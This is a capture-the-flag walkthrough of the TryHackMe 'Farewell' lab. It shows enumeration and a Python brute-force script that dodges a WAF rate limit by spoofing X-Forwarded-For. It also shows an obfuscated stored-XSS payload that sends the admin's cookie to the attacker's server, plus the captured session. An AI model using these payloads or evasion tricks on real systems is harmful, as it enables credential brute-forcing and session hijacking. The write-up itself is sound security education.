---
title: "TryHackMe: Farewell"
author: jaxafed
categories: [TryHackMe]
tags: [linux, web, php, xss, stored xss, javascript, rate-limit, rate-limit bypass, waf, waf bypass, brute-force]
render_with_liquid: false
media_subpath: /images/tryhackme_farewell/
image:
  path: room_image.webp
---

**Farewell** started with bypassing rate-limiting enforced by the **WAF** to brute-force a user's password and gain authenticated access to the web application. Afterwards, by exploiting a **Cross-Site Scripting (XSS)** vulnerability that also required bypassing the WAF, we stole the admin user's cookies, allowing us to access the web application as **admin** and complete the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/farewell){: .center }

## Initial Enumeration

### Nmap Scan

As usual, we start with an **nmap** scan:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.247.18
Nmap scan report for 10.10.247.18
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4a:81:c7:34:ab:76:2c:5f:9a:ab:00:ad:71:8a:d4:3f (ECDSA)
|_  256 63:c1:bc:e7:ea:94:f0:ab:06:af:03:f5:32:7a:e4:87 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Farewell \xE2\x80\x94 Login
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

* **22** (`SSH`)
* **80** (`HTTP`)

One interesting thing to note from the **nmap** output is the `httponly` flag not being set on the server-issued cookie, which will be relevant later.

### Web 80

Looking at port **80**, we only see a login form and nothing else.

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

## Access as User

### Discovering User Hints

Testing the login form, one interesting thing that immediately stands out is the different responses for valid and invalid users:

![Web 80 Login Notvalid](web_80_login_notvalid.webp){: width="1200" height="600"}
![Web 80 Login Valid](web_80_login_valid.webp){: width="1200" height="600"}

Checking the login request for a valid user in Burp Suite, we find something noteworthy in the response: it includes the **password hint** for the user, with the hint for the `admin` user being **"the year plus a kind send-off"**.

![Web 80 Login Password Hint Admin](web_80_login_password_hint_admin.webp){: width="1000" height="500"}

From the top of the index page, there is also a list of users who recently sent messages, so we can try logging in as these users to extract their password hints too.

![Web 80 Index Users](web_80_index_users.webp){: width="1200" height="600"}

Checking the password hint for `adam`, we see: **"favorite pet + 2""**.

![Web 80 Login Password Hint Adam](web_80_login_password_hint_adam.webp){: width="1000" height="500"}

For `deliver11`, it is: **"Capital of Japan followed by 4 digits"**.

![Web 80 Login Password Hint Deliver11](web_80_login_password_hint_deliver11.webp){: width="1000" height="500"}

And lastly for `nora`, it is: **"lucky number 789"**.

![Web 80 Login Password Hint Nora](web_80_login_password_hint_nora.webp){: width="1000" height="500"}

### Brute-Forcing the Password

Reviewing the password hints, we cannot determine the `admin`’s "year" or "send-off," nor the "favorite pet" for `adam`, nor the "lucky number" for `nora`. However, for **`deliver11`**, we know the capital of Japan, so we can try to brute-force the 4 digits that follow it.

If we attempt this using `ffuf`, we quickly notice that instead of receiving the usual `auth_failed` response with a `200` status code, we receive `403` for all responses.

```console
$ ffuf -u 'http://10.10.247.18/auth.php' -X POST -d 'username=deliver11&password=TokyoFUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w <(seq -w 0 9999) -mc all

0002                    [Status: 403, Size: 780, Words: 136, Lines: 40, Duration: 86ms]
0020                    [Status: 403, Size: 780, Words: 136, Lines: 40, Duration: 95ms]
0001                    [Status: 403, Size: 780, Words: 136, Lines: 40, Duration: 97ms]
...
```
{: .wrap }

Running `ffuf` again, this time with `-x http://127.0.0.1:8080` to inspect the request in Burp Suite, we see that we are blocked by the **WAF**, and the only obvious difference compared to normal login traffic is the **User-Agent**.

![Web 80 Login User Agent](web_80_login_user_agent.webp){: width="1000" height="500"}

We can try to fix this by changing the user agent for `ffuf` by adding the flag:

```
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
```

This seems to work; however, after a few successful requests, we start getting `403` responses again. This probably indicates some form of **rate-limiting** to prevent brute-forcing.

```console
$ ffuf -u 'http://10.10.247.18/auth.php' -X POST -d 'username=deliver11&password=TokyoFUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w <(seq -w 0 9999) -mc all -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'

0000                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 83ms]
0001                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 81ms]
0002                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 84ms]
0003                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 81ms]
0004                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 86ms]
0005                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 82ms]
0006                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 83ms]
0007                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 82ms]
0008                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 86ms]
0009                    [Status: 200, Size: 152, Words: 8, Lines: 1, Duration: 81ms]
0010                    [Status: 403, Size: 780, Words: 136, Lines: 40, Duration: 97ms]
0011                    [Status: 403, Size: 780, Words: 136, Lines: 40, Duration: 84ms]
0012                    [Status: 403, Size: 780, Words: 136, Lines: 40, Duration: 85ms]
...
```
{: .wrap }

After some testing, we discover that we can bypass the rate-limit by using the **`X-Forwarded-For`** header.

![Web 80 Rate Limit](web_80_rate_limit.webp){: width="1000" height="500"}
![Web 80 Rate Limit Two](web_80_rate_limit2.webp){: width="1000" height="500"}

Knowing this, we can write a simple Python script that picks a random IP value for the `X-Forwarded-For` header for each request to bypass the rate-limit:

```python
import requests
import random
import concurrent.futures

URL = "http://10.10.247.18/auth.php"

def worker(digits):
    xfwd = ".".join(str(random.randint(1, 255)) for _ in range(4))
    data = {
        "username": "deliver11",
        "password": f"Tokyo{digits}",
    }
    try:
        r = requests.post(
            URL,
            headers={"X-Forwarded-For": xfwd, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"},
            data=data,
        )
    except Exception:
        return None

    if b"auth_failed" not in r.content:
        return digits

    return None


if __name__ == "__main__":

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(worker, f"{digits:04}") for digits in range(0, 10000)]
        try:
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result is not None:
                    print(f"[+] VALID DIGITS FOUND: {result}")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                    
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            executor.shutdown(wait=False, cancel_futures=True)
```
{: file="brute.py" }

Running the script, we are able to discover the correct 4 digits for the `deliver11` user’s password.

```console
$ python3 brute.py
[+] VALID DIGITS FOUND: [REDACTED]
```

Now, logging in with the discovered credentials as `deliver11:Tokyo[REDACTED]`, we discover the user flag in the dashboard.

![Web 80 Dashboard User Flag](web_80_dashboard_user_flag.webp){: width="1200" height="600"}

## Access as Admin

### Discovering XSS

Looking at the dashboard, we see a form to submit messages.

![Web 80 Dashboard](web_80_dashboard.webp){: width="1200" height="600"}

Testing it with a message, we see that it appears with the **Pending Review** status, meaning it will likely be reviewed by the admin.

![Web 80 Dashboard Two](web_80_dashboard2.webp){: width="1200" height="600"}

Knowing that our message will probably be reviewed by the admin user, we test it with a simple XSS payload such as: `<img src="http://10.14.101.76/test.jpg" />`.

![Web 80 Dashboard Xss](web_80_dashboard_xss.webp){: width="1200" height="600"}

After submitting our payload, we see a request from the server for the image, confirming that our XSS payload works.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.247.18 - - [14/Nov/2025 23:19:00] code 404, message File not found
10.10.247.18 - - [14/Nov/2025 23:19:00] "GET /test.jpg HTTP/1.1" 404 -
```

### Bypassing Filters

Now that we know XSS works, the problem becomes what to do with it. From our initial **nmap** scan output or by checking the cookie-setting response, we can see that the `PHPSESSID` cookie is missing the `httponly` flag, which means we can access it with JavaScript and steal it.

However, trying a simple payload to steal the cookies such as:

```xml
<img src=x onerror="fetch('http://10.14.101.76/?c='+document.cookie)">
```

we see the request is blocked by the firewall.

![Web 80 Dashboard Xss Two](web_80_dashboard_xss2.webp){: width="1200" height="600"}

By splitting our payload and testing individual components, the blocked keywords appear to be **`fetch`** and **`cookie`**.

```console
$ curl -s 'http://10.10.247.18/dashboard.php' -H 'Cookie: PHPSESSID=69le85mmja2mnl7pjrbj4ps41v' -d 'farewell_message=onerror' | grep "403 Forbidden"

$ curl -s 'http://10.10.247.18/dashboard.php' -H 'Cookie: PHPSESSID=69le85mmja2mnl7pjrbj4ps41v' -d 'farewell_message=fetch' | grep "403 Forbidden"
<title>403 Forbidden</title>

$ curl -s 'http://10.10.247.18/dashboard.php' -H 'Cookie: PHPSESSID=69le85mmja2mnl7pjrbj4ps41v' -d 'farewell_message=cookie' | grep "403 Forbidden"
<title>403 Forbidden</title>

$ curl -s 'http://10.10.247.18/dashboard.php' -H 'Cookie: PHPSESSID=69le85mmja2mnl7pjrbj4ps41v' -d 'farewell_message=document' | grep "403 Forbidden"
```
{: .wrap }

We can try to bypass this by wrapping our payload in `eval()` so we can treat it as a string and use string concatenation to avoid blocked keywords:

```xml
<img src=x onerror=eval("fet"+"ch('http://10.14.101.76/?c='+document.coo"+"kie)") >
```

However, this still returns a `403`.

![Web 80 Dashboard Xss Four](web_80_dashboard_xss4.webp){: width="1000" height="5000"}

After some more testing, we see that while `<img` and `onerror` do not get flagged individually, combining them does.

```console
$ curl -s 'http://10.10.247.18/dashboard.php' -H 'Cookie: PHPSESSID=69le85mmja2mnl7pjrbj4ps41v' -d 'farewell_message=<img' | grep "403 Forbidden"

$ curl -s 'http://10.10.247.18/dashboard.php' -H 'Cookie: PHPSESSID=69le85mmja2mnl7pjrbj4ps41v' -d 'farewell_message=onerror' | grep "403 Forbidden"

$ curl -s 'http://10.10.247.18/dashboard.php' -H 'Cookie: PHPSESSID=69le85mmja2mnl7pjrbj4ps41v' -d 'farewell_message=<img onerror' | grep "403 Forbidden"
<title>403 Forbidden</title>
```
{: .wrap }

We can try to bypass this by simply changing `<img` to `<IMG`, resulting in the payload:

```xml
<IMG src=x onerror=eval("fet"+"ch('http://10.14.101.76/?c='+document.coo"+"kie)") >
```

> If you are using `Burp Suite` to submit the payload, make sure to URL-encode it so the `+` isn't interpreted as `space` and cause problems.
{: .prompt-tip }


Submitting it, we see that the payload now bypasses the filter.

![Web 80 Dashboard Xss Three](web_80_dashboard_xss3.webp){: width="1200" height="600"}

On our webserver, we successfully capture the admin user’s cookie:

```
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.247.18 - - [14/Nov/2025 23:49:06] "GET /?c=PHPSESSID=p1nl180lk6e6cuul9m9gts89qf HTTP/1.1" 200 -
```

> At this point, if your payload bypasses the filters and seems like it should work but doesn't, try restarting the machine.
{: .prompt-warning }

Going back to the web application and replacing our `PHPSESSID` cookie with the one captured from the admin:

![Web 80 Dashboard Cookie](web_80_dashboard_cookie.webp){: width="1200" height="600"}

Refreshing the page after the cookie change, we see that we were able to log in as the **admin** user.

![Web 80 Dashboard Admin](web_80_dashboard_admin.webp){: width="1200" height="600"}

Lastly, checking `/admin.php`, we capture the admin flag and complete the room.

![Web 80 Admin Flag](web_80_admin_flag.webp){: width="1200" height="600"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
